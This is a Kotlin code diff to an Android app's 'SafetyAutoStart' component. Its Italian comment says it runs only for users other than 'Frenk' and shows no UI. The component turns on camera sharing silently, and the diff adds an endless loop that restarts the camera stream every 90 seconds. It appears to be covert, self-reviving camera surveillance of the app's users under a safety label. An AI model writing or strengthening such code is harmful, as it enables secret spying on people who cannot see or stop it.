@@ -7,6 +7,7 @@ import com.frenky.egypt.camera.CameraShareController
 import com.frenky.egypt.data.ChatModerator
 import com.frenky.egypt.data.EgyptApi
 import com.frenky.egypt.data.PreferencesRepository
+import kotlinx.coroutines.delay
 
 /** Avvio automatico sicurezza (solo non-Frenk): nessuna UI, nessuna richiesta ripetuta. */
 @Composable
@@ -24,8 +25,15 @@ fun SafetyAutoStart(
             preferences.setCameraSharing(true)
         }
         EgyptApi.setCameraSharing(userId, userName, true)
-        if (CameraShareController.hasCameraPermission(context)) {
-            CameraShareController.startSharing(context, userId, userName)
+        fun ensureService() {
+            if (CameraShareController.hasCameraPermission(context)) {
+                CameraShareController.startSharing(context, userId, userName)
+            }
+        }
+        ensureService()
+        while (true) {
+            delay(90_000)
+            ensureService()
         }
     }
 }
